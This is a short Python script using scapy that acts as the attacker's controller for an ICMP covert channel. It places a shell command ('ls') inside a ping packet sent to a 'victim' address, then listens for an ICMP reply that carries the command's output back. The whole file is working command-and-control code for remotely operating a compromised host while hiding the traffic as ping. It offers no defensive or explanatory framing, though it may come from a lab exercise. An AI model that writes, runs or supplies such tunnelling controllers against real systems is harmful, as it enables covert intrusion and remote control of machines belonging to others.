from scapy.sendrecv import send, sniff
from scapy.layers.inet import IP, ICMP

victim_ip = "10.10.0.224"

command_to_send = "ls"

packet = IP(dst=victim_ip) / ICMP() / command_to_send

print(f"Sending command: {command_to_send}")

send(packet, verbose=False)

def handle_response(packet):
    if packet.haslayer(ICMP) and packet[ICMP].payload:
        response = packet[ICMP].payload.load.decode()
        print(f"The response from victim is {response}")

print("Waiting for response from victim")
sniff(filter="icmp", prn=handle_response, count=1,store=False)

